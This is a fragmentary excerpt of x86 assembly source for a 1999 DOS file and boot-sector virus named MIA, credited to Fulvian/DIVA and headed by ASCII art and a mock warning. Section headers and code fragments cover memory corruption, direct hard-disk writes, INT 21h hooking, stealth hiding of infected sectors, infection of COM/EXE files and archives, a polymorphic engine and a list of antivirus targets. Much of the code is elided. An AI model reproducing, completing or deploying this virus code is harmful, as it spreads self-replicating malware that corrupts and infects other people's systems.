...
```
 Comment                                                          [DIVA] 1999
   ...
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▌█  ♥   WARNING: DISTRIBUTION OF THIS FILE IS (not) VERY ILLEGAL!!  ♥   █▐
 │▌█♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥ █▐│
 │▌█  ♥   ♥   ♥   ♥   ♥   ♥ ┌─────────┐┌─┐┌─────┐ ♥   ♥   ♥   ♥   ♥   ♥   █▐│
 │▌█♥   ♥   ♥   ♥   ♥   ♥   │█████████││█││█████│   ♥   ♥   ♥   ♥   ♥   ♥ █▐│
 │▌█  ♥   ♥   ♥   ♥   ♥   ♥ │█┌─┐█┌─┐█││█││█┌─┐█│ ♥   ♥   ♥   ♥   ♥   ♥   █▐│
 ...
 │▌█♥   ♥   ♥   ♥   ♥   ♥   └─┘  ♥  └─┘└─┘└─┘ └─┘   ♥   ♥   ♥   ♥   ♥   ♥ █▐│
 │▌█  ♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥   ♥   █▐│
  ▌█♥   ♥  (P) & (C) 1999 Fulvian/DIVA, Fully registered to: Mia W. ♥   ♥ █▐
   ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
                             D I S C L A I M E R:
...
;────────────[ Corrupts conventional memory and build hide-out ]──────────────
...
Uppercore:
 ...
 pop    ds                     
 call   Rand16
 mov    ax,0C02Ah              ; Opcode AX = SUB AL,AL ───► AL=00
 jnp    Jived
 mov    al,32h                 ; Opcode AX = XOR AL,AL ───► AL=00
 js     Jived
 mov    ax,0D6F8h              ; Opcode AX = CLC + SETALC ───► AL=00
 jnc    Jived
 mov    ax,00B0h               ; Opcode AX = MOV AL,00 ───► AL=00
 jz     Jived
 sub    al,8Ch                 ; Opcode AX = AND AL,00 ───► AL=00
...
;──────────────[ This is the payload: display colourful string ]──────────────
...
;─────────────────[ Generate (oligomorphic) boot-launcher ]───────────────────
...
;     0000:7D4A  8E C4              MOV     ES,SP ◄─── Set read buffer segment
;     0000:7D4C  8E D4              MOV     SS,SP ◄─── Set stack segment
;     0000:7D4E  B9 53 50           MOV     CX,5053 ◄─── Track 80, sector 83
;     0000:7D51  BC 9A E4           MOV     SP,E49A ◄─── Set stack pointer
;     0000:7D54  BA 00 01           MOV     DX,0100 ◄─── Side 1, drive A
;     0000:7D57  B8 11 02           MOV     AX,0211 ◄─── Read 17 sectors
;     0000:7D5A  BB 71 1A           MOV     BX,1A7D ◄─── Read buffer offset
...
;──────────────────[ Direct IDE hard disk access (write) ]────────────────────
...
;──────────────[ Viral sectors hiding/protection procedure ]──────────────────
...
;────────────────[ Attempting to grab int 21h after boot-strap ]────────────────
...
;──────────────[ Let Me brag for a while, blah, blah, blah... ]───────────────
...
;
;     0CCB:00AB  9C                 PUSHF
;     0CCB:00AC  80 FC 13           CMP     AH,13 ◄─── Set disk INT handler?
;     0CCB:00AF  74 06              JZ      00B7 ◄─── Jump if yes
;     0CCB:00B1  9D                 POPF
;     0CCB:00B2  EA D6 01 F9 0B     JMP     0BF9:01D6 ◄─── Relative address
...
;───────[ Entry point (after decryption) of .BIN, .COM, .EXE, files ]─────────
...
Free_Block:
 ...
 pop    ax
 sub    si,ax
 jnc    Low_Block              ; CF=0 ───► new segment is below host's MCB ??
...
;
;     00C9:0FB2  90                 NOP ◄─┬─ These 2 NOPs will be a short JMP
;     00C9:0FB3  90                 NOP ◄─┘  to 0FB7 if no XMS driver installed                                 
;     00C9:0FB4  E8 CE 00           CALL    1085 ◄─── A20 line check subroutine                            
;     00C9:0FB7  2E FF 2E 82 0F     JMP     CS:FAR [0F82] ◄─── JMP FF33:41E9                        
;
; This is MS-DOS v7.10 kernel, take a look! (MIA hasn't yet TSR)
;
;     FF33:41E5  8A E1              MOV     AH,CL ◄─── For CP/M style call
;     FF33:41E7  EB 06              JMP     41EF                             
;     FF33:41E9  FA                 CLI           ◄─── DOS kernel entry point                            
;     FF33:41EA  80 FC 73           CMP     AH,73                              
;     FF33:41ED  77 D2              JA      41C1                               
;     FF33:41EF  80 FC 33           CMP     AH,33 ◄─── Target JMP of CP/M call                             
...
;     FF33:41EA  80 FC 73           CMP     AH,73                              
;     FF33:41ED  77 D2              JA      41C1                               
;     FF33:41EF  CD 83              INT     83 ◄─── Points at viral handler                               
...
Keep_Seek:
 ...
 jne    Sideswipe              ; MOV AH,CL ───► for CP/M call style (see above)
...
;──────[ Check whether file at DS:SI has BIN/COM/EXE extension or not ]───────
...
;───────────────────[ DOS function AH=4Eh/4Fh dispatcher ]────────────────────
...
;───────────────────[ DOS function AH=11h/12h dispatcher ]────────────────────
...
;─────────────────────[ DOS function AH=57h dispatcher ]──────────────────────
...
;─────────────────────[ DOS function AH=42h dispatcher ]──────────────────────
...
;─────────────────[ DOS function AH=3Ch/5Bh/6Ch dispatcher ]──────────────────
...
;─────────────────────[ DOS function AH=60h dispatcher ]──────────────────────
...
;─────────────────────[ DOS function AH=44h dispatcher ]──────────────────────
...
;─────────────[ DOS function AH=3Dh/41h/43h/4Bh/56h dispatcher ]──────────────
...
;───────────────────[ This handles .LHA/.LZH/.PAK files ]─────────────────────
...
;────────────[ Create random filename with .COM/.EXE extension ]──────────────
...
;──────────────────[ .ARJ packed file's header structure ]────────────────────
...
;─────────────[ .LHA/.LZH/.PAK packed file's header structure ]───────────────
...
;──────────────────[ .RAR packed file's header structure ]────────────────────
...
;────────────────[ MULTIFORMER, fast-polymorphic generator ]──────────────────
...
Lseeker:
 ...
 sub    cx,cx                  ; Zero CX
 cwd                           ; Convert word into doubleword: AX ───► DX:AX
 int    03h
 ret
...
;───────────────────[ DOS function AH=3Fh/40h dispatcher ]────────────────────
...
;───────────────────[ DOS function AH=48h/67h dispatcher ]────────────────────
...
Removable:
 ...
 and    di,si 
 int    03h                    ; If CF=0,
 cbw                           ; AL = 00h ───► UMB is unavailable or
 push   ax                     ; AL = 01h ───► UMB is in DOS memory chain
 or     al,01h
...
;───────────────────[ DOS function AH=00h/4Ch dispatcher ]────────────────────
...
;───────────────────[ DOS function AH=49h/4Ah dispatcher ]────────────────────
...
;─────────────────────[ DOS function AH=25h dispatcher ]──────────────────────
...
;─────────────────────[ DOS function AH=3Eh dispatcher ]──────────────────────
...
;────────────[ Steal virus portion without disinfects the file ]──────────────
 ...
 jnz    Unclasp                ; ZF=0 ───► file's not infected
 push   ds
...
;───────────[ Here's the list of suckers (who make MIA paranoid) ]────────────
...
;─────────────────────[ DOS function AH=19h dispatcher ]──────────────────────
...
;─────────────────────[ DOS function AH=0Eh dispatcher ]──────────────────────
...
;────────────────────[ INT 21h functions handler table ]──────────────────────
...
Message  db '               This is MIA virus version 1.30ß, size:  000'
Virsize  db '0 bytes               '                     
